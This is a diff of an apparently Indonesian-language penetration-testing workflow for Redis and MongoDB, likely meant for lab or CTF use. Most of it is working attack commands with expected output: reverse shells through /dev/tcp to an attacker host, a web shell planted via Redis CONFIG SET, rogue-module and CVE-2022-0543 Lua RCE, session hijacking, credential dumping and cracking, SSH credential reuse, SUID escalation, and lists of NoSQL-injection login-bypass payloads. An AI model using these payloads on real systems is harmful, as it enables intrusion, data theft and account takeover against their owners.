-curl "http://$TARGET/shell.php?cmd=$REVSHELL"
-
-# Atau URL encode lebih aman:
 curl -G "http://$TARGET/shell.php" \
     --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
 ```
 
 **OUTPUT GAGAL ❌ — HTTP 404:**
 
-text
-
-```
-<!DOCTYPE HTML>
-<title>404 Not Found</title>
+```text
+404 Not Found
 ```
 
 ➡️ File tidak ada di web root. Coba path lain:
 
-Bash
-
-```
-# Cek dari nmap scan — port web server apa?
+```bash
 nmap -p 80,443,8080,8443,8000 $TARGET
-
-# Coba akses dengan nama file yang berbeda
 curl "http://$TARGET/uploads/shell.php?cmd=id"
-curl "http://$TARGET/shell.php?cmd=id"
-```
-
-**OUTPUT GAGAL ❌ — HTTP 200 tapi tidak ada output:**
-
-text
-
-```
-(response kosong / hanya HTML template)
-```
-
-➡️ PHP mungkin tidak terinstall. Coba ekstensi lain:
-
-Bash
-
-```
-# ASP (Windows IIS)
-rcli CONFIG SET dbfilename shell.asp
-rcli SET webshell "<%@ Page Language=\"C#\" %><% Response.Write(new System.Diagnostics.Process(){ StartInfo = new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c \" + Request[\"cmd\"]) { UseShellExecute=false, RedirectStandardOutput=true } }.Start() ? \"\": \"\"); %>"
-
-# Coba JSP
-rcli CONFIG SET dbfilename shell.jsp
 ```
 
 ---
 
-### PATH 2D — Redis Module Loading (RCE Advanced)
-
-> **Prasyarat:** Redis 4.x+, bisa upload file .so ke target
-
-Bash
-
-```
-# STEP 1: Clone exploit tool
-git clone https://github.com/n0b0dyCN/redis-rogue-server /tmp/redis-rogue
-cd /tmp/redis-rogue
-
-# STEP 2: Jalankan rogue server (all-in-one)
-python3 redis-rogue-server.py \
-    --rhost $TARGET \
-    --rport 6379 \
-    --lhost $LHOST \
-    --lport $LPORT
-
-# Alternatif manual:
-# STEP 3: Clone module exploit
-git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand /tmp/redis-module
-cd /tmp/redis-module
-make
-
-# STEP 4: Upload module via Redis + HTTP server
-# Di attacker, serve file:
-python3 -m http.server 8080 &
-
-# STEP 5: Download module di target via Redis Lua
-rcli EVAL "local f = io.open('/tmp/exp.so','wb'); f:write(io.open('/dev/stdin','rb'):read('*a')); f:close()" 0
-
-# Atau via curl jika ada koneksi:
-# rcli EVAL "os.execute('curl http://$LHOST:8080/exp.so -o /tmp/exp.so')" 0
-
-# STEP 6: Load module
-rcli MODULE LOAD /tmp/exp.so
-
-# STEP 7: Execute command
-rcli system.exec "id"
-rcli system.exec "whoami"
-```
-
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-"uid=0(root) gid=0(root) groups=0(root)"
-```
-
-➡️ RCE via module! Spawn reverse shell:
-
-Bash
-
-```
-rcli system.exec "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
-```
-
-**OUTPUT GAGAL ❌ — Module load error:**
-
-text
-
-```
-(error) ERR Error loading shared library /tmp/exp.so: Operation not permitted
-```
-
-➡️ AppArmor atau SELinux blocking. Coba:
-
-Bash
-
-```
-# Cek apakah AppArmor aktif
-rcli EVAL "os.execute('aa-status')" 0
-
-# Jika aktif, coba lokasi yang di-whitelist
-rcli MODULE LOAD /var/lib/redis/exp.so
-rcli MODULE LOAD /usr/lib/redis/exp.so
-```
-
----
-
-### PATH 2E — Lua Script Injection (CVE-2022-0543)
+### PATH 2D — Lua Script Injection (CVE-2022-0543)
 
 > **Versi vulnerable:** Redis 7.0.0 - 7.0.4 (Debian/Ubuntu packages)
 
-Bash
-
-```
+```bash
 # Cek versi Redis dulu
 rcli INFO server | grep redis_version
-# Jika 7.0.0 - 7.0.4 → mungkin vulnerable
 
 # STEP 1: Test basic Lua execution
 rcli EVAL "return os.execute('id')" 0
@@ -3052,45 +2721,36 @@ f:close()
 
 **OUTPUT BERHASIL ✅:**
 
-text
-
-```
+```text
 "uid=0(root) gid=0(root) groups=0(root)\n"
 ```
 
 **OUTPUT GAGAL ❌ — Lua sandbox:**
 
-text
-
-```
+```text
 (error) ERR Error running script: user_script:1: attempt to call a nil value (global 'os')
 ```
 
-➡️ Versi Redis tidak vulnerable atau library path berbeda:
+➡️ Coba library path lain:
 
-Bash
-
-```
-# Coba library path lain
+```bash
 rcli EVAL "return package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.2.so.0', 'luaopen_io')" 0
 rcli EVAL "return package.loadlib('/usr/lib/liblua.so', 'luaopen_io')" 0
 ```
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-## FASE 3: REDIS — DENGAN CREDENTIALS WEB APP
+## FASE 3: REDIS — SESSION HIJACKING & CACHE EXPLOIT
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-> **Scenario:** Redis digunakan oleh web application, dan kita menemukan credentials atau session token di dalamnya.
+> **Scenario:** Redis digunakan oleh web application. Cari session token atau cached credentials.
 
 ### Langkah 3.1 — Extract Session Data dari Redis
 
-Bash
-
-```
+```bash
 # List semua keys — cari pattern session
 rcli KEYS "session:*"
 rcli KEYS "sess_*"
@@ -3112,11 +2772,9 @@ for key in $(rcli KEYS "session:*"); do
 done
 ```
 
-**OUTPUT BERHASIL ✅ — Session data ditemukan:**
+**OUTPUT BERHASIL ✅ — Session data admin ditemukan:**
 
-text
-
-```
+```text
 === Key: session:abc123xyz ===
 Type: hash
 1) "user_id"
@@ -3129,12 +2787,10 @@ Type: hash
 8) "true"
 ```
 
-➡️ **Hijack session admin!**
+➡️ Hijack session admin!
 
-Bash
-
-```
-# Ambil session ID (abc123xyz = bagian setelah "session:")
+```bash
+# Ambil session ID
 export SESSION_ID="abc123xyz"
 
 # Gunakan session cookie di browser atau curl
@@ -3148,73 +2804,30 @@ rcli HSET "session:$SESSION_ID" "is_admin" "true"
 
 **OUTPUT BERHASIL ✅ — Cache data dengan credentials:**
 
-text
-
-```
+```text
 === Key: cache:user:admin ===
 Type: string
 {"id":1,"username":"admin","password":"$2y$10$abc...","api_key":"sk-admin-xyz"}
 ```
 
-➡️ Simpan dan crack:
+➡️ Crack hash:
 
-Bash
-
-```
-echo '{"id":1,"username":"admin","password":"$2y$10$abc..."}' | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['username']+':'+d['password'])" >> ~/redis_mongo_loot/creds/found_creds.txt
-
+```bash
 # Crack bcrypt hash
 hashcat -m 3200 '$2y$10$abc...' /usr/share/wordlists/rockyou.txt
 ```
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-## FASE 4: REDIS — AUTHENTICATED (DARI CHAIN LAIN)
+## FASE 4: REDIS — POST-EXPLOITATION
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-> **Scenario:** Dapat credentials Redis dari file SMB, web config, dll. Masuk sini.
+### Langkah 4.1 — Setelah Dapat Shell dari Redis
 
-Bash
-
-```
-# Masuk dengan credentials yang ditemukan
-redis-cli -h $TARGET -p 6379 -a "$REDIS_PASS"
-
-# Atau gunakan AUTH command setelah connect
-redis-cli -h $TARGET -p 6379
-127.0.0.1:6379> AUTH FoundPasswordHere
-OK
-127.0.0.1:6379> PING
-+PONG
-```
-
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-OK
-+PONG
-```
-
-➡️ Lanjutkan dengan workflow yang sama mulai dari **Langkah 1.3 (Recon)**
-
----
-
-## ══════════════════════════════════════════
-
-## FASE 5: REDIS — POST-EXPLOITATION
-
-## ══════════════════════════════════════════
-
-### Langkah 5.1 — Setelah Dapat Shell dari Redis
-
-Bash
-
-```
+```bash
 # Di shell redis user / root:
 
 # 1. Stabilkan shell
@@ -3222,10 +2835,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 # Ctrl+Z → stty raw -echo; fg → Enter Enter
 
 # 2. Info dasar
-id
-whoami
-hostname
-cat /etc/os-release
+id; whoami; hostname; cat /etc/os-release
 
 # 3. Cari file sensitif
 find /home -name "*.txt" -o -name "*.key" -o -name "*.conf" 2>/dev/null
@@ -3238,87 +2848,54 @@ cat /etc/hosts
 
 # 5. Cek privilege untuk escalation
 sudo -l
-find / -perm -4000 -type f 2>/dev/null  # SUID binaries
+find / -perm -4000 -type f 2>/dev/null   # SUID binaries
 
 # 6. Cari credentials lain di sistem
 grep -ri "password" /etc/ 2>/dev/null | grep -v Binary
 find / -name ".env" -readable 2>/dev/null
-find / -name "*.conf" -readable 2>/dev/null | xargs grep -iE "password|pass|secret" 2>/dev/null
+cat /home/redis/.bash_history  # Sering ada credential di history!
 ```
 
 **OUTPUT BERHASIL ✅ — SUID binary ditemukan:**
 
-text
-
-```
+```text
 /usr/bin/sudo
-/usr/bin/pkexec
 /usr/bin/find
 ```
 
-➡️ Jika dapat `/usr/bin/find` → eskalasi privilege:
+➡️ Jika dapat `/usr/bin/find`:
 
-Bash
-
-```
+```bash
 find . -exec /bin/sh -p \; -quit
 # → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
 # → ke <a href="/docs/sudo-suid-capabilities" class="text-[#00b4d8] hover:underline font-mono font-semibold">47_sudo_suid_capabilities_workflow.md</a>
 ```
 
-**OUTPUT BERHASIL ✅ — Credentials lain ditemukan:**
+### Langkah 4.2 — Cross-Service Credential Testing dari Redis
 
-text
-
-```
-/var/www/html/.env:DB_PASSWORD=SuperSecret123
-/etc/mysql/my.cnf:password=dbpass123
-```
-
-➡️ Test credentials ke service lain:
-
-Bash
-
-```
-# Test MySQL
-nxc mysql $TARGET -u root -p SuperSecret123
-mysql -h $TARGET -u root -pSuperSecret123
-
-# Test SSH (mungkin password reuse)
-ssh admin@$TARGET  # masukkan SuperSecret123
-
-# Test ke service lain (cross-service testing)
-```
-
-### Langkah 5.2 — Cross-Service Credential Testing dari Redis
-
-text
-
-```
+```text
 Redis Creds/Shell Found
-        │
-        ├──→ Port 22   (SSH)      → ssh user@$TARGET
-        ├──→ Port 21   (FTP)      → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
-        ├──→ Port 80   (HTTP)     → login ke web app
-        ├──→ Port 3306 (MySQL)    → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
-        ├──→ Port 5432 (PostgreSQL)→ <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
-        ├──→ Port 27017 (MongoDB) → Fase 6 di bawah
-        └──→ AD Environment       → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
+     │
+     ├──→ Port 22   (SSH)        → ssh user@$TARGET
+     ├──→ Port 21   (FTP)        → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
+     ├──→ Port 80   (HTTP)       → login ke web app
+     ├──→ Port 3306 (MySQL)      → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
+     ├──→ Port 5432 (PostgreSQL) → <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
+     ├──→ Port 27017 (MongoDB)   → Fase 5 di bawah
+     └──→ AD Environment         → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
 ```
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-## FASE 6: MONGODB — DETEKSI & AUTENTIKASI
+## FASE 5: MONGODB — DETEKSI & AUTENTIKASI
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-### Langkah 6.1 — Konfirmasi MongoDB & Auth Check
+### Langkah 5.1 — Konfirmasi MongoDB & Auth Check
 
-Bash
-
-```
+```bash
 # Command 1: Connect langsung tanpa auth
 mongosh "mongodb://$TARGET:27017" --eval "db.version()" --quiet
 
@@ -3327,67 +2904,34 @@ mongo --host $TARGET --port 27017 --eval "db.version()" --quiet
 
 # Command 3: Nmap script untuk detail
 nmap -p 27017 --script mongodb-info $TARGET
-
-# Command 4: Banner grab
-echo "" | nc -vn $TARGET 27017 2>/dev/null | strings | head -20
 ```
 
 **OUTPUT BERHASIL ✅ — Unauthenticated access:**
 
-text
-
-```
-4.4.28
-```
-
-atau dengan mongosh:
-
-text
-
-```
+```text
 Current Mongosh Log ID: abc123
 Connecting to: mongodb://10.10.11.200:27017
 Using MongoDB: 4.4.28
 test> 4.4.28
 ```
 
-➡️ **MongoDB TIDAK ada auth!** Langsung ke **Langkah 6.2 (Recon)**
+➡️ MongoDB TIDAK ada auth! Langsung ke **Langkah 5.2 (Recon)**
 
 **OUTPUT GAGAL ❌ — Auth required:**
 
-text
-
-```
+```text
 MongoServerError: command listDatabases requires authentication
 ```
 
-atau:
-
-text
-
-```
-MongoServerError: Unauthorized
-```
-
-➡️ MongoDB butuh credentials. Lanjut ke **Langkah 6.1b**
+➡️ MongoDB butuh credentials. Lanjut ke **Langkah 5.1b**
 
 ---
 
-### Langkah 6.1b — Brute Force / Cari Credentials MongoDB
+### Langkah 5.1b — Brute Force / Cari Credentials MongoDB
 
-Bash
-
-```
+```bash
 # Coba default credentials
-DEFAULT_CREDS=(
-    "admin:admin"
-    "admin:password"
-    "admin:mongo"
-    "root:root"
-    "mongodb:mongodb"
-    "mongo:mongo"
-    "admin:"
-)
+DEFAULT_CREDS=("admin:admin" "admin:password" "admin:mongo" "root:root" "mongodb:mongodb")
 
 for cred in "${DEFAULT_CREDS[@]}"; do
     user=$(echo $cred | cut -d: -f1)
@@ -3404,68 +2948,36 @@ done
 # Nmap brute force
 nmap -p 27017 --script mongodb-brute $TARGET
 
-# Cari di file konfigurasi (jika punya akses sistem lain)
+# Cari di file konfigurasi
 cat /etc/mongod.conf
 find / -name "*.env" -readable 2>/dev/null | xargs grep -i "mongo" 2>/dev/null
-find / -name "config.yml" -readable 2>/dev/null | xargs grep -i "mongo" 2>/dev/null
 ```
 
-**OUTPUT BERHASIL ✅ — Default creds works:**
+**OUTPUT BERHASIL ✅:**
 
-text
-
-```
+```text
 [+] CREDS FOUND: admin:admin
-```
-
-➡️ Gunakan credentials tersebut:
-
-Bash
-
-```
-mongosh "mongodb://admin:admin@$TARGET:27017/admin"
-```
-
-**OUTPUT BERHASIL ✅ — Credentials di config file:**
-
-text
-
-```
-# /etc/mongod.conf or .env file
-MONGO_URL=mongodb://dbuser:dbpass123@localhost:27017/appdb
-```
-
-➡️ Test credentials:
-
-Bash
-
-```
-mongosh "mongodb://dbuser:dbpass123@$TARGET:27017/appdb"
 ```
 
 **OUTPUT GAGAL ❌ — Semua default creds gagal:**
 
-text
-
-```
+```text
 MongoServerError: Authentication failed.
 ```
 
-➡️ Cari di tempat lain:
+➡️ Cari di:
 
 - Source code web app (GitHub, Gitea yang exposed)
-- File backup yang bisa diakses via SMB/FTP
+- File backup via SMB/FTP
 - `.env` file via LFI/path traversal
 - **Google:** `"inurl:mongod.conf filetype:conf password"`
 
 ---
 
-### Langkah 6.2 — MongoDB Reconnaissance Lengkap
+### Langkah 5.2 — MongoDB Reconnaissance Lengkap
 
-Bash
-
-```
-# Buat alias untuk kemudahan
+```bash
+# Buat URI
 if [ -n "$MONGO_USER" ]; then
     MONGO_URI="mongodb://$MONGO_USER:$MONGO_PASS@$TARGET:27017"
 else
@@ -3480,36 +2992,32 @@ mongosh "$MONGO_URI" --eval "show dbs" --quiet
 # 2. Version info
 mongosh "$MONGO_URI" --eval "db.version()" --quiet
 
-# 3. Server status (info lengkap)
-mongosh "$MONGO_URI" --eval "db.serverStatus()" --quiet | head -50
-
-# 4. List users (butuh admin)
+# 3. List users (butuh admin)
 mongosh "$MONGO_URI/admin" --eval "db.getUsers()" --quiet
 
-# 5. System users dengan hash
-mongosh "$MONGO_URI/admin" --eval "db.system.users.find().pretty()" --quiet | tee ~/redis_mongo_loot/mongo/system_users.txt
+# 4. System users dengan hash
+mongosh "$MONGO_URI/admin" --eval "db.system.users.find().pretty()" --quiet \
+    | tee ~/redis_mongo_loot/mongo/system_users.txt
 ```
 
 **OUTPUT BERHASIL ✅ — show dbs:**
 
-text
-
-```
-admin    40.00 KiB
+```text
+admin   40.00 KiB
 appdb    2.50 MiB
 users    1.00 MiB
-config   12.00 KiB
-local    72.00 KiB
+config  12.00 KiB
+local   72.00 KiB
 ```
 
-➡️ Ada database `appdb` dan `users` — ini yang paling menarik untuk data dump!
+➡️ Ada database `appdb` dan `users` — ini yang paling menarik!
 
-**Langkah selanjutnya — Dump setiap database:**
+---
 
-Bash
+### Langkah 5.3 — Dump Semua Collections
 
-```
-# Untuk setiap database non-default (skip admin, config, local)
+```bash
+# Dump setiap database non-default
 for db in appdb users; do
     echo "=== DATABASE: $db ==="
     
@@ -3521,7 +3029,8 @@ for db in appdb users; do
     
     for coll in $collections; do
         echo "--- Collection: $coll ---"
-        mongosh "$MONGO_URI/$db" --eval "db.$coll.find().limit(20).pretty()" --quiet | tee ~/redis_mongo_loot/mongo/${db}_${coll}.txt
+        mongosh "$MONGO_URI/$db" --eval "db.$coll.find().limit(20).pretty()" --quiet \
+            | tee ~/redis_mongo_loot/mongo/${db}_${coll}.txt
         echo "Count: $(mongosh "$MONGO_URI/$db" --eval "db.$coll.count()" --quiet)"
     done
 done
@@ -3529,9 +3038,7 @@ done
 
 **OUTPUT BERHASIL ✅ — Collections dengan data sensitif:**
 
-text
-
-```
+```text
 === DATABASE: appdb ===
 users
 products
@@ -3551,32 +3058,18 @@ flags
 ]
 ```
 
-➡️ **JACKPOT!** Simpan semua credentials:
+➡️ **JACKPOT!** Simpan credentials ke file:
 
-Bash
-
-```
-# Extract semua password
-cat ~/redis_mongo_loot/mongo/appdb_users.txt | python3 -c "
-import json, sys, re
-content = sys.stdin.read()
-# Cari pattern username/password
-passwords = re.findall(r'\"(?:username|user)\": \"([^\"]+)\".*?\"(?:password|pass)\": \"([^\"]+)\"', content, re.DOTALL)
-for user, passwd in passwords:
-    print(f'{user}:{passwd}')
-" | tee ~/redis_mongo_loot/creds/mongo_creds.txt
+```bash
+echo "admin:AdminP@ss2024!" >> ~/redis_mongo_loot/creds/mongo_creds.txt
+echo "john:john123" >> ~/redis_mongo_loot/creds/mongo_creds.txt
 ```
 
 ---
 
-### Langkah 6.3 — Credential Reuse dari MongoDB
+### Langkah 5.4 — Credential Reuse dari MongoDB
 
-Bash
-
-```
-# Test semua credentials yang ditemukan ke service lain
-cat ~/redis_mongo_loot/creds/mongo_creds.txt
-
+```bash
 # Test SSH untuk setiap user:password yang ditemukan
 while IFS=: read -r user pass; do
     echo "[*] Testing SSH: $user:$pass"
@@ -3600,324 +3093,689 @@ done < ~/redis_mongo_loot/creds/mongo_creds.txt
 
 **OUTPUT BERHASIL ✅ — SSH login berhasil:**
 
-text
-
-```
+```text
 [+] SSH SUCCESS: root:toor
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ➡️ SSH ke target:
 
-Bash
-
-```
+```bash
 sshpass -p "toor" ssh root@$TARGET
-# atau
-ssh root@$TARGET  # masukkan: toor
 # → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a> untuk full workflow
 ```
 
 ---
 
-### Langkah 6.4 — Extract & Crack MongoDB Hashes
+### Langkah 5.5 — Extract & Crack MongoDB Hashes
 
-Bash
-
-```
-# Dump system user hashes dari admin database
+```bash
+# Dump system user hashes
 mongosh "$MONGO_URI/admin" --eval "db.system.users.find().pretty()" --quiet \
     | tee ~/redis_mongo_loot/mongo/system_users_raw.txt
 
-# Parse hash dari output
-# Format MongoDB SCRAM-SHA-256:
-# storedKey + serverKey = yang perlu di-crack
+# Crack dengan hashcat
+# MongoDB SCRAM-SHA-256 (mode 24100)
+hashcat -m 24100 ~/redis_mongo_loot/mongo/system_users_raw.txt \
+    /usr/share/wordlists/rockyou.txt --force
 
-# Dengan hashcat - mode 24100 (SCRAM-SHA-256)
-# Perlu extract format yang benar dulu
-python3 << 'EOF'
-import json, sys, re
-
-# Baca file hasil dump
-with open('/root/redis_mongo_loot/mongo/system_users_raw.txt') as f:
-    content = f.read()
-
-# Cari credentials
-# Format: username:db:SCRAM-SHA-256$iterations:salt$storedKey:serverKey
-print("[*] Mencari hash MongoDB...")
-# Manual extraction biasanya diperlukan dari output pretty print
-EOF
-
-# Cara termudah: gunakan mongodump untuk export
-mongodump --host $TARGET --port 27017 --db admin --out /tmp/mongodump/
-
-# Atau hashcat langsung dengan format MongoDB
-hashcat -m 24100 hash.txt /usr/share/wordlists/rockyou.txt --force
-hashcat -m 24200 hash.txt /usr/share/wordlists/rockyou.txt --force  # SCRAM-SHA-1
+# MongoDB SCRAM-SHA-1 untuk versi lama (mode 24200)
+hashcat -m 24200 ~/redis_mongo_loot/mongo/system_users_raw.txt \
+    /usr/share/wordlists/rockyou.txt --force
 ```
 
 **OUTPUT BERHASIL ✅ — Hash cracked:**
 
-text
-
-```
+```text
 $scram$...:password123
 ```
 
 ---
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-## FASE 7: NOSQL INJECTION (MongoDB di Web App)
+## FASE 6: NOSQL INJECTION VIA BURP SUITE
 
-## ══════════════════════════════════════════
+## ═══════════════════════════════════════
 
-> **Scenario:** Web app menggunakan MongoDB tanpa sanitasi → NoSQL Injection
+> **Scenario:** Web app menggunakan MongoDB tanpa sanitasi → NoSQL Injection via Burp Suite lebih efektif dan visual dibanding terminal karena bisa intercept, modify, dan replay request dengan mudah.
 
-### Langkah 7.1 — Identifikasi Endpoint yang Vulnerable
+---
 
-Bash
+### Langkah 6.1 — Setup Burp Suite untuk NoSQL Injection
 
-```
-# Cari login form atau search yang mungkin pakai MongoDB
-# Test dengan payload sederhana dulu
+```bash
+# STEP 1: Pastikan Burp Suite proxy aktif (default: 127.0.0.1:8080)
+# STEP 2: Set browser proxy ke 127.0.0.1:8080
+# STEP 3: Install Burp CA certificate di browser (untuk HTTPS)
 
-# Method 1: URL parameter dengan operator MongoDB
-# Test di URL parameter
-curl -s "http://$TARGET/search?q[$ne]=test" -o /dev/null -w "%{http_code}"
-curl -s "http://$TARGET/user?id[$gt]=0" | head -20
-
-# Method 2: POST body - form encoded
-curl -s -X POST "http://$TARGET/login" \
-    -d "username=admin&password[$ne]=wrong" \
-    -v 2>&1 | grep -E "HTTP|Location|Set-Cookie"
-
-# Method 3: POST body - JSON
-curl -s -X POST "http://$TARGET/api/login" \
-    -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":{"$ne":"wrong"}}' \
-    -v 2>&1 | grep -E "HTTP|token|session|admin"
-
-# Method 4: Burp Suite intercept dan modifikasi request
-# (Manual testing lebih efektif untuk ini)
+# Alternatif: gunakan curl dengan proxy Burp untuk verifikasi
+curl -X POST "http://$TARGET/login" \
+    -d "username=admin&password=test" \
+    --proxy http://127.0.0.1:8080
 ```
 
-**OUTPUT BERHASIL ✅ — Login bypass berhasil:**
+**OUTPUT BERHASIL ✅ — Request tertangkap di Burp:**
 
-text
+```text
+POST /login HTTP/1.1
+Host: 10.10.11.200
+Content-Type: application/x-www-form-urlencoded
 
+username=admin&password=test
 ```
+
+➡️ Lanjut ke Langkah 6.2
+
+**OUTPUT GAGAL ❌ — Request tidak tertangkap:**
+
+```text
+(tidak ada request di Burp Proxy > Intercept)
+```
+
+➡️ Cek:
+
+- Intercept diaktifkan: **Burp > Proxy > Intercept > "Intercept is on"**
+- Browser proxy sudah diset ke `127.0.0.1:8080`
+- Untuk HTTPS: install CA cert di browser dari `http://burpsuite/`
+
+---
+
+### Langkah 6.2 — Identifikasi Endpoint & Intercept Request
+
+```bash
+# Dari terminal — identifikasi endpoint login dulu
+curl -s "http://$TARGET/" | grep -iE "form|action|login|api"
+curl -s "http://$TARGET/login" | grep -iE "method|action|name="
+
+# Identify apakah JSON atau form-encoded
+curl -v -X POST "http://$TARGET/login" \
+    -d "username=test&password=test" \
+    --proxy http://127.0.0.1:8080 2>&1 | grep "Content-Type"
+```
+
+**OUTPUT BERHASIL ✅ — Form login ditemukan:**
+
+```html
+<form method="POST" action="/login">
+    <input type="text" name="username">
+    <input type="password" name="password">
+</form>
+```
+
+➡️ Form encoded (application/x-www-form-urlencoded) → Ke **Langkah 6.3A**
+
+**OUTPUT BERHASIL ✅ — API JSON ditemukan:**
+
+```html
+fetch('/api/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username, password}) })
+```
+
+➡️ JSON body → Ke **Langkah 6.3B**
+
+---
+
+### Langkah 6.3A — NoSQL Injection via Burp (Form-Encoded / URL Parameter)
+
+> **Cara kerja:** Di Burp Proxy > Intercept, tangkap request login normal, lalu **klik kanan > Send to Repeater** untuk modifikasi berulang.
+
+**STEP 1: Tangkap request normal di Burp Intercept**
+
+```text
+POST /login HTTP/1.1
+Host: 10.10.11.200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=admin&password=test
+```
+
+**STEP 2: Send to Repeater (Ctrl+R)**
+
+**STEP 3: Di Repeater, modifikasi body — coba payload satu per satu:**
+
+```text
+# Payload 1: $ne (not equal) — paling umum
+username=admin&password[$ne]=wrong
+
+# Payload 2: $gt (greater than)
+username=admin&password[$gt]=
+
+# Payload 3: $regex (match anything)
+username=admin&password[$regex]=.*
+
+# Payload 4: Bypass username juga
+username[$ne]=x&password[$ne]=x
+
+# Payload 5: $exists
+username=admin&password[$exists]=true
+
+# Payload 6: Array bypass
+username=admin&password[$in][]=admin&password[$in][]=password123
+```
+
+**OUTPUT BERHASIL ✅ — Response berbeda dari login normal:**
+
+Sebelum injection:
+
+```text
+HTTP/1.1 401 Unauthorized
+{"error":"Invalid credentials"}
+```
+
+Setelah injection dengan `password[$ne]=wrong`:
+
+```text
 HTTP/1.1 302 Found
 Location: /dashboard
-Set-Cookie: session=eyJhbGc...
+Set-Cookie: session=eyJhbGciOiJIUzI1NiIs...
+
+atau:
+
+HTTP/1.1 200 OK
+{"success":true,"token":"eyJhbGciOiJIUzI1NiIs...","user":"admin"}
 ```
 
-atau JSON response:
+➡️ **AUTH BYPASS BERHASIL!** Catat token/session:
 
-JSON
+```bash
+export SESSION_TOKEN="eyJhbGciOiJIUzI1NiIs..."
 
+# Gunakan token untuk request berikutnya
+curl -H "Authorization: Bearer $SESSION_TOKEN" "http://$TARGET/admin/"
+curl -H "Cookie: session=$SESSION_TOKEN" "http://$TARGET/admin/"
 ```
-{"success": true, "token": "eyJhbGciOiJIUzI1NiIs..."}
+
+**OUTPUT BERHASIL ✅ — Response berubah tapi bukan sukses:**
+
+```text
+HTTP/1.1 200 OK
+{"error":"Username not found"}   ← berbeda dari "Invalid credentials"!
 ```
 
-➡️ **AUTH BYPASS BERHASIL!** Gunakan token/session untuk akses admin.
+➡️ Ini tanda injection **BEKERJA SEBAGIAN** — field password dibypass tapi username salah. Coba variasi username:
 
-**OUTPUT BERHASIL ✅ — Data leak dari search:**
-
-JSON
-
+```text
+# Di Burp Repeater:
+username[$ne]=nonexistent&password[$ne]=wrong
 ```
+
+**OUTPUT GAGAL ❌ — Response sama persis:**
+
+```text
+HTTP/1.1 401 Unauthorized
+{"error":"Invalid credentials"}
+```
+
+➡️ Kemungkinan sanitasi berjalan. Coba:
+
+**Di Burp Repeater, ubah Content-Type header:**
+
+```text
+# Dari:
+Content-Type: application/x-www-form-urlencoded
+
+# Ke:
+Content-Type: application/json
+```
+
+**Dan ubah body ke JSON:**
+
+```json
+{"username":"admin","password":{"$ne":"wrong"}}
+```
+
+---
+
+### Langkah 6.3B — NoSQL Injection via Burp (JSON Body)
+
+> **Ini adalah metode paling efektif untuk modern web app yang pakai API.**
+
+**STEP 1: Tangkap request JSON normal di Burp Intercept**
+
+```text
+POST /api/login HTTP/1.1
+Host: 10.10.11.200
+Content-Type: application/json
+Content-Length: 42
+
+{"username":"admin","password":"wrongpass"}
+```
+
+**STEP 2: Send to Repeater (Ctrl+R)**
+
+**STEP 3: Di Repeater Tab, modifikasi JSON body:**
+
+```json
+// Payload 1: $ne — COBA INI DULU
+{"username":"admin","password":{"$ne":""}}
+
+// Payload 2: Bypass kedua field sekaligus
+{"username":{"$ne":"nonexistent"},"password":{"$ne":"nonexistent"}}
+
+// Payload 3: $gt
+{"username":"admin","password":{"$gt":""}}
+
+// Payload 4: $exists
+{"username":{"$exists":true},"password":{"$exists":true}}
+
+// Payload 5: $or untuk enumerate
+{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$ne":""}}
+
+// Payload 6: $in untuk multiple tries
+{"username":"admin","password":{"$in":["admin","password","admin123",""]}}
+
+// Payload 7: $regex
+{"username":"admin","password":{"$regex":".*"}}
+
+// Payload 8: $where (versi lama MongoDB saja)
+{"username":"admin","$where":"function(){return true;}"}
+```
+
+**Di Burp Repeater — cara memodifikasi:**
+
+1. Klik di area body (bawah)
+2. Hapus `"wrongpass"`
+3. Ganti dengan `{"$ne":""}`
+4. Klik **Send**
+5. Bandingkan response
+
+**OUTPUT BERHASIL ✅ — JSON injection berhasil:**
+
+```text
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "success": true,
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+  "user": {
+    "id": 1,
+    "username": "admin",
+    "role": "administrator"
+  }
+}
+```
+
+➡️ **AUTH BYPASS BERHASIL!**
+
+```bash
+# Gunakan token
+export JWT_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
